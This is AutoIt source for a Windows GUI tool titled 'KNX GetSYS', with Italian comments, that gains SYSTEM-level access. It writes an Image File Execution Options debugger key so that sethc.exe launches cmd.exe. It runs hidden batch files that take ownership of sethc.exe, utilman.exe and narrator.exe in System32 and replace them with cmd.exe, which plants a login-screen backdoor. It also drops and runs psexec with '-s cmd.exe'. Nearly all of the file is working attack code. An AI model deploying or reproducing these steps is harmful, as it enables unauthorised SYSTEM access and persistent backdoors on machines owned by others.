#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=Arrioch-Halloween-Fella.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <WinAPIFiles.au3>
_WinAPI_Wow64EnableWow64FsRedirection(False)

;- AUTOIT GET SYSTEM - Privilege Escalation trought sethc.exe process. Rapid Method
;- Adding a debugger control in registry for run cmd.exe instead sethc.exe

fileinstall("GAMEOVER.jpg",@tempdir & "\logo.jpg")
fileinstall("Billy.jpg", @tempdir & "\logo1.jpg")
fileinstall("help.txt", @TempDir & "\help.txt")
fileinstall("ninja.jpg", @TempDir & "\ninja.jpg")
fileinstall("psexec.exe", @tempdir & "\psexec.exe")
fileinstall("PowerPrompt.exe", @tempdir & "\PowerPrompt.exe")
fileinstall("RunasSystem.exe", @tempdir & "\RunasSystem.exe")

$logo = @tempdir & "\logo1.jpg"

SplashImageOn("Test", $logo,400, 155,-1,-1,1)
Sleep(2000)
Splashoff()

#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <SendMessage.au3>
#include <ColorConstants.au3>

Global Const $SC_DRAGMOVE = 0xF012

HotKeySet("{ESC}", "On_Exit")


;-***** FORM AND CONTROL CREATION ****************************************
$Form1 = GUICreate("KNX GetSYS", 530, 600, -1, -1, 0x80880000)
$ninja = guictrlcreatepic(@TempDir & "\ninja.jpg", 10, 6, 0, 0)
$knx = GUICtrlCreateLabel("KNX 2015 - GetSYS", 150, 50, 350,40)
$logon = GUICtrlCreateLabel("Get System At LoginScreen", 11, 165, 300,40)
$now = GUICtrlCreateLabel("Get System NOW!!", 330, 165, 300,40)
$label1 = GUICtrlCreateLabel("Reg Debugger", 11,203,297)
$regenable = GUICtrlCreateButton("Enable", 11, 221, 81, 23)
$regdisable = GUICtrlCreateButton("Dsiable", 106, 221, 81, 23)
$debugger = GUICtrlCreateLabel("STATUS", 203, 224, 60, 17)
$label5 = GUICtrlCreateLabel("PsExec", 330, 203, 297)
$psenable = GUICtrlCreateButton("Run", 330, 221, 81, 23)
$label2 = GUICtrlCreateLabel("SetHC", 11, 257, 297)
$sethcenable = GUICtrlCreateButton("Enable", 11, 275, 81, 23)
$sethcdisable = GUICtrlCreateButton("Dsiable", 106, 275, 81, 23)
$sethc = GUICtrlCreateLabel("STATUS", 203, 278, 60, 17)
$label6 = GUICtrlCreateLabel("RunAsSystem", 330, 257, 297)
$runas = GUICtrlCreateButton("Run", 330, 275, 81, 23)
$label3 = GUICtrlCreateLabel("UtilMan", 11, 311, 297)
$utilenable = GUICtrlCreateButton("Enable",11, 329, 81, 23)
$utildisable = GUICtrlCreateButton("Dsiable", 106, 329, 81, 23)
$utilman = GUICtrlCreateLabel("STATUS", 203, 332, 110, 17)
$label4 = GUICtrlCreateLabel("Narrator", 11, 365, 297)
$narratorenable = GUICtrlCreateButton("Enable", 11, 383, 81, 23)
$narratordisable = GUICtrlCreateButton("Dsiable", 106, 383, 81, 23)
$narrator = GUICtrlCreateLabel("STATUS", 203, 386, 110, 17)
$label7 = GUICtrlCreateLabel("PowerPrompt", 330, 311, 297)
$power = GUICtrlCreateButton("Run", 330, 329, 81, 23)
$label8 = GUICtrlCreateLabel("Commands", 330, 365, 297)
$Help = GUICtrlCreateButton("Help", 330, 383, 81, 23)
$Exit = GUICtrlCreateButton("Exit", 425, 383, 81, 23)
$shell = GUICtrlCreateEdit("", 11, 423,505, 170, BitOR($ES_AUTOVSCROLL,$ES_AUTOHSCROLL,$ES_WANTRETURN))
;-***** END FORM AND CONTROL CREATION ************************************

;-***** STYLE AND COLOR ***********************************************************
GUISetBkColor($COLOR_BLACK)
GUICtrlSetFont($knx, 28)
GUICtrlSetColor($knx, 0x3399FF)
GUICtrlSetFont($logon, 16)
GUICtrlSetColor($logon, 0x3399FF)
GUICtrlSetFont($now, 16)
GUICtrlSetColor($now, 0x3399FF)
GUICtrlSetColor($label1, 0x3399FF)
GUICtrlSetFont ($label1, 8.5, 700)
GUICtrlSetColor($label8, 0x3399FF)
GUICtrlSetFont ($label8, 8.5, 700)
GUICtrlSetColor($regenable, 0x3399FF)
GUICtrlSetBkColor($regenable, 0x000000)
GUICtrlSetColor($regdisable, 0x3399FF)
GUICtrlSetBkColor($regdisable, 0x000000)
GUICtrlSetColor($label5, 0x3399FF)
GUICtrlSetFont ($label5, 8.5, 700)
GUICtrlSetColor($psenable, 0x3399FF)
GUICtrlSetBkColor($psenable, 0x000000)
GUICtrlSetColor($power, 0x3399FF)
GUICtrlSetBkColor($power, 0x000000)
GUICtrlSetColor($label2, 0x3399FF)
GUICtrlSetFont ($label2, 8.5, 700)
GUICtrlSetColor($label6, 0x3399FF)
GUICtrlSetFont ($label6, 8.5, 700)
GUICtrlSetColor($label7, 0x3399FF)
GUICtrlSetFont ($label7, 8.5, 700)
GUICtrlSetColor($runas, 0x3399FF)
GUICtrlSetBkColor($runas, 0x000000)
GUICtrlSetColor($sethcenable, 0x3399FF)
GUICtrlSetBkColor($sethcenable, 0x000000)
GUICtrlSetColor($sethcdisable, 0x3399FF)
GUICtrlSetBkColor($sethcdisable, 0x000000)
GUICtrlSetColor($label3, 0x3399FF)
GUICtrlSetFont ($label3, 8.5, 700)
GUICtrlSetColor($utilenable, 0x3399FF)
GUICtrlSetBkColor($utilenable, 0x000000)
GUICtrlSetColor($utildisable, 0x3399FF)
GUICtrlSetBkColor($utildisable, 0x000000)
GUICtrlSetColor($label4, 0x3399FF)
GUICtrlSetFont ($label4, 8.5, 700)
GUICtrlSetColor($narratorenable, 0x3399FF)
GUICtrlSetBkColor($narratorenable, 0x000000)
GUICtrlSetColor($narratordisable, 0x3399FF)
GUICtrlSetBkColor($narratordisable, 0x000000)
GUICtrlSetColor($Help, 0x3399FF)
GUICtrlSetBkColor($Help, 0x000000)
GUICtrlSetColor($Exit, 0x3399FF)
GUICtrlSetBkColor($Exit, 0x000000)
GUICtrlSetColor($shell, 0x3399FF)
GUICtrlSetBkColor($shell, 0x000000)
GUICtrlSetFont ($shell, 8.5, 700)
GUISetState(@SW_SHOW)
;-***** END STYLE AND COLOR *******************************************************

if @OSVersion = "WIN_XP" Or @OSVersion = "WIN_XPe" or @OSVersion = "WIN_2003" then
	GUICtrlSetState($narratorenable, $GUI_DISABLE)
	GUICtrlSetState($narratordisable, $GUI_DISABLE)
	GUICtrlSetState($runas, $GUI_DISABLE)
	GUICtrlSetColor($label3, $COLOR_GRAY)
	GUICtrlSetColor($label4, $COLOR_GRAY)
	GUICtrlSetColor($label6, $COLOR_GRAY)
	guictrlsetdata($narrator, "NOT SUPPORTED")
	GUICtrlSetColor($narrator, $COLOR_RED)
	GUICtrlSetState($utilenable, $GUI_DISABLE)
	GUICtrlSetState($utildisable, $GUI_DISABLE)
	guictrlsetdata($utilman, "NOT SUPPORTED")
	GUICtrlSetColor($utilman, $COLOR_RED)
	guictrlsetdata($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  @OSVersion & " Detected" & @CRLF , 1)
	existcheck("debugger")
	existcheck("sethc")
else
	GUICtrlSetState($power, $GUI_DISABLE)
	GUICtrlSetColor($label7, $COLOR_GRAY)
	guictrlsetdata($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  @OSVersion & " Detected" & @CRLF , 1)
	existcheck("debugger")
	existcheck("sethc")
	existcheck("utilman")
	existcheck("narrator")
endif

GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " Program start" & @CRLF , 1)


While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
	    Case $GUI_EVENT_PRIMARYDOWN
             _SendMessage($Form1, $WM_SYSCOMMAND, $SC_DRAGMOVE, 0)
		Case $GUI_EVENT_CLOSE
			 On_Exit()
		 Case $psenable
			Runwait(@tempdir & "\psexec.exe -i -s -d cmd.exe -accepteula",@TempDir, @SW_HIDE)
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " psexec Hack Launched" & @CRLF , 1)
		 Case $runas
			Runwait(@tempdir & "\RunasSystem.exe" ,@TempDir, @SW_HIDE)
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " RunAsSystem Hack Launched" & @CRLF , 1)
		 Case $power
			Runwait(@tempdir & "\PowerPrompt.exe" ,@TempDir, @SW_HIDE)
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " PowerPrompt Hack Launched" & @CRLF , 1)
		 Case $regenable
			$esito = RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger", "REG_SZ", "C:\windows\system32\cmd.exe")
			if $esito = 1 Then
			   existcheck("debugger")
			Else
			   errorcheck(@error)
			EndIf
		 Case $regdisable
			$del = RegDelete("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe")
			Select
			   case $del = 1
				  existcheck("debugger")
			   case $del = 0
				  MsgBox(16,"Cancellazione","key/value does not exist.")
				  GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " key/value does not exist." & @CRLF , 1)
			   case $del = 2
				  errorcheck(@error)
			EndSelect
		 Case $sethcenable
			hackfile("sethc.exe")
		 Case $sethcdisable
			restorefile("sethc.exe")
		 Case $utilenable
			hackfile("utilman.exe")
		 Case $utildisable
			restorefile("utilman.exe")
		 Case $narratorenable
			hackfile("narrator.exe")
		 Case $narratordisable
			restorefile("narrator.exe")
		 Case $Help
			run("notepad.exe " & @TempDir & "\help.txt")
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " aperto il file di Help" & @CRLF , 1)
		Case $Exit
			On_Exit()
	EndSwitch
WEnd


;-*************************************************************************************************************************************
;-**************** FUNZIONI ***********************************************************************************************************
;-*************************************************************************************************************************************

;-**************** VERIFICO ESISTENZA PATCH NEL SISTEMA *******************************************************************************
func existcheck($name)
	if $name = "debugger" then
		$esiste = RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger")
		if @error = "" Then
			GUICtrlSetData($debugger, "ENABLE")
			GUICtrlSetColor($debugger, $COLOR_GREEN)
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " debugger Hack ENABLE" & @CRLF , 1)
			sleep(200)
		Else
			GUICtrlSetData($debugger, "DISABLE")
			GUICtrlSetColor($debugger, $COLOR_RED)
			GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " debugger Hack DISABLE" & @CRLF , 1)
			sleep(200)
		EndIf
	Else
		Select
			case $name = "sethc"
				if FileExists("c:\windows\system32\" & $name & ".exe.bak") Then
					GUICtrlSetData($sethc, "ENABLE")
					GUICtrlSetColor($sethc, $COLOR_GREEN)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack ENABLE" & @CRLF , 1)
					sleep(200)
				Else
					GUICtrlSetData($sethc, "DISABLE")
					GUICtrlSetColor($sethc, $COLOR_RED)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack DISABLE" & @CRLF , 1)
					sleep(200)
				Endif
			case $name = "utilman"
				if FileExists("c:\windows\system32\" & $name & ".exe.bak") Then
					GUICtrlSetData($utilman, "ENABLE")
					GUICtrlSetColor($utilman, $COLOR_GREEN)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack ENABLE" & @CRLF , 1)
					sleep(200)
				Else
					GUICtrlSetData($utilman, "DISABLE")
					GUICtrlSetColor($utilman, $COLOR_RED)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack DISABLE" & @CRLF , 1)
					sleep(200)
				Endif
			case $name = "narrator"
				if FileExists("c:\windows\system32\" & $name & ".exe.bak") Then
					GUICtrlSetData($narrator, "ENABLE")
					GUICtrlSetColor($narrator, $COLOR_GREEN)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack ENABLE" & @CRLF , 1)
					sleep(200)
				Else
					GUICtrlSetData($narrator , "DISABLE")
					GUICtrlSetColor($narrator, $COLOR_RED)
					GUICtrlSetData($shell, @HOUR & ":" & @MIN & ":" & @SEC & " - " &  " " & $name & " Hack DISABLE" & @CRLF , 1)
					sleep(200)
				Endif
			EndSelect
	Endif

EndFunc

;-**************** GESTIONE DEGLI ERRORI DELLE OPERAZIONI DI REGISTRO *****************************************************************
func errorcheck($error)
   select
   case $error = 1
	  $messaggio = " unable to open requested key"
	  MsgBox(16,"Errore", $messaggio )
	  GUICtrlSetData($shell,@HOUR & ":" & @MIN & ":" & @SEC & " - " & $messaggio & @CRLF , 1)
   case $error = 2
	  $messaggio = " unable to open requested main key"
	  MsgBox(16,"Errore", $messaggio)
	  GUICtrlSetData($shell,@HOUR & ":" & @MIN & ":" & @SEC & " - " & $messaggio & @CRLF , 1)
   case $error = 3
	  $messaggio = " unable to remote connect to the registry"
	  MsgBox(16,"Errore", $messaggio)
	  GUICtrlSetData($shell,@HOUR & ":" & @MIN & ":" & @SEC & " - " & $messaggio & @CRLF , 1)
   case $error = -1
	  $messaggio = " unable to open requested value"
	  MsgBox(16,"Errore", $messaggio)
	  GUICtrlSetData($shell,@HOUR & ":" & @MIN & ":" & @SEC & " - " & $messaggio & @CRLF , 1)
   case $error = -2
	  $messaggio = " value type not supported Remarks"
	  MsgBox(16,"Errore", $messaggio)
	  GUICtrlSetData($shell,@HOUR & ":" & @MIN & ":" & @SEC & " - " & $messaggio & @CRLF , 1)
   EndSelect
EndFunc

;-**************** FUNZIONE Exit *******************************************************************************************************

Func On_Exit()
	GUISetState(@SW_HIDE)
	$logo = @tempdir & "\logo.jpg"
	SplashImageOn("Test", $logo, 400, 271,-1,-1,1)
	Sleep(1000)
	Splashoff()
	FileDelete(@TempDir & "\help.txt")
	FileDelete(@TempDir & "\logo.jpg")
	FileDelete(@TempDir & "\logo1.jpg")
	FileDelete(@TempDir & "\ninja.jpg")
	FileDelete(@tempdir & "\psexec.exe")
	FileDelete(@tempdir & "\PowerPrompt.exe")
	FileDelete(@tempdir & "\RunasSystem.exe")
    Exit
  EndFunc

;-*************** FUNZIONE RENAME E MOVE FILE *******************************************************************************************
func hackfile($file)

	Local $hFileOpen = FileOpen(@TempDir & "\" & $file & ".cmd", 2)
    If $hFileOpen = -1 Then
        MsgBox(64, "", "An error occurred when create the file.")
        Return False
    EndIf

	FileWrite($hFileOpen, "takeown /f c:\windows\system32\" & $file & @CRLF)
	FileWrite($hFileOpen, "icacls c:\windows\system32\" & $file & " /grant administrators:F /T" & @CRLF)
	FileWrite($hFileOpen, "mkdir c:\windows\system32\util" & @CRLF)
	FileWrite($hFileOpen, "xcopy c:\windows\system32\cmd.exe c:\windows\system32\util\" & @CRLF)
	FileWrite($hFileOpen, "ren c:\windows\system32\" & $file & " " & $file & ".bak" & @CRLF)
	FileWrite($hFileOpen, "ren c:\windows\system32\util\cmd.exe " & $file & @CRLF)
	FileWrite($hFileOpen, "xcopy c:\windows\system32\util\" & $file & " c:\windows\system32\ /Y" & @CRLF)
	FileWrite($hFileOpen, "rmdir /s /q c:\windows\system32\util\" & @CRLF)
	fileclose($hFileOpen)

	runwait(@TempDir & "\" & $file & ".cmd" ,@TempDir, @SW_HIDE)
	FileDelete(@TempDir & "\" & $file & ".cmd")

	$file2 = StringSplit($file, ".")
	existcheck($file2[1])

   EndFunc

;-************** FUNZIONE RESTORE FILE **************************************************************************************************
func restorefile($file)
	if FileExists("c:\windows\system32\" & $file & ".bak") Then
		filedelete("c:\windows\system32\" & $file)
		FileMove("c:\windows\system32\" & $file & ".bak", "c:\windows\system32\" & $file)
	endif
	$file2 = StringSplit($file, ".")
	existcheck($file2[1])
EndFunc


